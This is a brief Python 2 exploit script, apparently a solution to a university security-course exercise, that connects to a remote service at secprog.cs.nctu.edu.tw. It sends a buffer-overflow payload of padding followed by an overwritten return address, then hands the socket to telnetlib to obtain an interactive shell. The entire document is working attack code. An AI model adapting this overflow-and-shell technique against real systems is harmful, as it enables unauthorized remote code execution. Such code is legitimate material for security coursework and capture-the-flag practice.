#!/usr/bin/python2

import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10001

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# payload = "a\n" . "\x00"."a"x71 . "\x0e\x86\x04\x08"
payload = "a\n";
soc.send(payload)

payload = "\x00" + "a"*71 + "\x0e\x86\x04\x08\n"
soc.send(payload)

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

